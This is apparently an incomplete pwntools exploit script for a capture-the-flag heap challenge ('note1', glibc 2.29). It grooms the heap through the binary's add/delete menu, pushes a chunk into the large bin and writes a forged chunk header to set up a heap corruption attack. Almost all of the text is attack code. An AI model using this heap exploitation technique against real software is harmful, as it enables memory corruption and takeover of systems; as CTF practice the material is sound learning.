#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './note1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.29.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Choice: ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(con)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil('Idx: ')
    p.sendline(str(idx))

def show(idx):
    eat()
    p.sendline('3')
    p.recvuntil('Idx: ')
    p.sendline(str(idx))

for i in range(16):
    add(0x10,'1')

for i in range(16):
    add(0x60,'1')

for i in range(9):
    add(0x70,'1')

for i in range(5):
    add(0xC0,'1')

for i in range(2):
    add(0xE0,'1')


add(0x170,'1')# 48
add(0x190,'1')# 49

add(0x2A50-0x40,'addralign') # 50

add(0xFF8,'large bin') # 51
add(0x18,'protect') # 52


dele(51)
add(0x2000,'push to large bin') # 51



add(0x28,p64(0) + p64(0x241) + b'\x28') # 53 fd->bk : 0xA0 - 0x18
debug()
p.interactive()
